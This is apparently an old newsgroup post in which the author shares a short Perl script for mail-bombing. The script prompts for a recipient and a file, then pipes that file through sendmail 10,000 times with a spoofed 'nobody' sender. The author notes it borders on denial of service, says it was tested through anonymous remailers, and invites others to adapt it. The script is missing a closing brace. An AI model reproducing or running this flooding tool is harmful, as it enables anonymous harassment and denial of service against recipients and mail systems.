OK...I know this borders on a "denial of service" attack since it may 
effect innocent users. How would you like to be the one to explain to  
your System Administrator that the Megabytes of returned Spam on the 
disk are yours? 
I realize that some peoples implementations of Sendmail will tell who
your are regardless, so you might have to modify the "system" line for
your own tastes. Also you might *not* want to be anon. Please feel
free to modify to your own tastes. The delay loop is to space out 
the load. I also tried it with premail instead of Sendmail and it
went thru the remailers just fine. It should be capable of running 
in the background. Only took 5 minutes to write and a couple of 
remailers to test.

print "Who does this go to?: ";
chop($name = <STDIN>);
print "What is the filename to send?: ";
chop($filename = <STDIN>);
for ($a=0;$a<100;$a++) {
for ($b=0;$b<100;$b++) {
system ("/usr/lib/sendmail -f nobody $name < $filename");
for ($x=0;$x<600000;$x++){};
}
